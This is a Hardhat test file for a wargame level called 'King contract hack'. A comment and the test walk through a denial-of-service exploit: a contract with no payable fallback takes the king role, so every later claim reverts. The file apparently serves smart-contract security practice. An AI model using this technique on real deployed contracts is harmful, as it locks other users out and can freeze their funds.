import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 09 - King contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const KingContract = await ethers.getContractFactory("King");
        const KingHackerContract = await ethers.getContractFactory("KingHack");
        
        const king = await KingContract.deploy({value: ethers.parseEther("1")});
        const kingHacker = await KingHackerContract.deploy(await king.getAddress());

        return {owner, hacker, king, kingHacker};
    };
    
    describe("When hacking", () => {
        it("Once the KingHacker contract becomes the King, it should be immutable", async() => {
            /*
             * The purpose of this level is to become the king on the King contract and avoid anyone else from claiming the throne.
             * This is quite simple: in order to become the king, the hacker must transfer an ETH balance sufficiently larger than the current price.
             * But to remain as a king, subsequent calls to the King's receive() method must revert.
             * 
             * By setting the KingHack contract -which lacks a fallback payable function- as the king, any other user
             * who tries to transfer a sufficiently larger ETH balance than the current prize will revert his actions.
             * 
             * Please note that KingHack has no payable receive or fallback method.
            **/
            const {owner, hacker, king, kingHacker} = await loadFixture(setUp);

            expect(await king._king()).to.equal(owner.address);

            await kingHacker.connect(hacker).convertIntoKing({value: ethers.parseEther("1.000001")});
            expect(await king._king()).to.equal(await kingHacker.getAddress());

            await expect(owner.sendTransaction({to: await king.getAddress(), value: ethers.parseEther("2")})).to.be.reverted;
        });
    });
});